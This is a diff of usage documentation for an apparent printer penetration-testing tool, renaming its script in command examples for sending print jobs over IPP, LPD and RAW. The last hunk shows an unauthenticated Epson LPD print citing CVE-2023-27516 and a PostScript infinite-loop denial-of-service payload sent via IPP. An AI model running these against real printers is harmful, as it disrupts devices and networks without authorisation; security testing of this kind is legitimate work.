@@ -15,10 +15,10 @@ Send any file type to the target printer using smart protocol auto-detection, TL
 
 ```bash
 # Auto-detect protocol (recommended)
-python printer-reaper.py 192.168.1.100 --send-job document.txt
+python printerxpl-forge.py 192.168.1.100 --send-job document.txt
 
 # Same as above (auto is default)
-python printer-reaper.py 192.168.1.100 --send-job photo.jpg --send-proto auto
+python printerxpl-forge.py 192.168.1.100 --send-job photo.jpg --send-proto auto
 ```
 
 ---
@@ -27,16 +27,16 @@ python printer-reaper.py 192.168.1.100 --send-job photo.jpg --send-proto auto
 
 ```bash
 # auto (default) — smart probe, picks best available protocol
-python printer-reaper.py 192.168.1.100 --send-job doc.pdf
+python printerxpl-forge.py 192.168.1.100 --send-job doc.pdf
 
 # IPP / IPPS — AirPrint compatible, auto-upgrades to TLS if required
-python printer-reaper.py 192.168.1.100 --send-job doc.pdf --send-proto ipp
+python printerxpl-forge.py 192.168.1.100 --send-job doc.pdf --send-proto ipp
 
 # LPD (port 515) — ESC/P native for Epson inkjets, prevents stuck-print issues
-python printer-reaper.py 192.168.1.100 --send-job doc.pdf --send-proto lpd
+python printerxpl-forge.py 192.168.1.100 --send-job doc.pdf --send-proto lpd
 
 # RAW (port 9100) — JetDirect passthrough for HP/PCL laser printers
-python printer-reaper.py 192.168.1.100 --send-job doc.pdf --send-proto raw
+python printerxpl-forge.py 192.168.1.100 --send-job doc.pdf --send-proto raw
 ```
 
 > **Epson inkjets**: use `--send-proto lpd` — the tool will encode text/images as ESC/P commands (Epson native language) via LPD passthrough, which avoids the "stuck print" issue caused by sending raw JPEG via LPD.
@@ -60,8 +60,8 @@ python printer-reaper.py 192.168.1.100 --send-job doc.pdf --send-proto raw
 ## Number of Copies
 
 ```bash
-python printer-reaper.py 192.168.1.100 --send-job flyer.pdf --send-copies 10
-python printer-reaper.py 192.168.1.100 --send-job memo.txt  --send-copies 50
+python printerxpl-forge.py 192.168.1.100 --send-job flyer.pdf --send-copies 10
+python printerxpl-forge.py 192.168.1.100 --send-job memo.txt  --send-copies 50
 ```
 
 ---
@@ -71,8 +71,8 @@ python printer-reaper.py 192.168.1.100 --send-job memo.txt  --send-copies 50
 When using `--send-proto lpd`, specify the queue name (default: `lp`):
 
 ```bash
-python printer-reaper.py 192.168.1.100 --send-job doc.txt --send-proto lpd --send-queue lp
-python printer-reaper.py 192.168.1.100 --send-job doc.txt --send-proto lpd --send-queue raw
+python printerxpl-forge.py 192.168.1.100 --send-job doc.txt --send-proto lpd --send-queue lp
+python printerxpl-forge.py 192.168.1.100 --send-job doc.txt --send-proto lpd --send-queue raw
 ```
 
 ---
@@ -83,14 +83,14 @@ If direct socket printing fails (printer hardened, format restrictions, authenti
 
 ```bash
 # Windows (requires PowerShell as Administrator)
-python printer-reaper.py 192.168.1.100 --install-printer
+python printerxpl-forge.py 192.168.1.100 --install-printer
 
 # With custom driver mode
-python printer-reaper.py 192.168.1.100 --install-printer --install-driver cups-ipp
-python printer-reaper.py 192.168.1.100 --install-printer --install-driver epson
+python printerxpl-forge.py 192.168.1.100 --install-printer --install-driver cups-ipp
+python printerxpl-forge.py 192.168.1.100 --install-printer --install-driver epson
 
 # With custom name
-python printer-reaper.py 192.168.1.100 --install-printer --install-name "LabPrinter"
+python printerxpl-forge.py 192.168.1.100 --install-printer --install-name "LabPrinter"
 ```
 
 **Driver modes:**
@@ -127,9 +127,9 @@ After installation, print from any application selecting the installed printer n
 
 ```bash
 # Epson LPD unauthenticated print (CVE-2023-27516)
-python printer-reaper.py 192.168.1.100 --send-job payload.txt --send-proto lpd
+python printerxpl-forge.py 192.168.1.100 --send-job payload.txt --send-proto lpd
 
 # PostScript DoS via IPP
 echo "{ } loop" > payload.ps
-python printer-reaper.py 192.168.1.100 --send-job payload.ps --send-proto ipp
+python printerxpl-forge.py 192.168.1.100 --send-job payload.ps --send-proto ipp
 ```
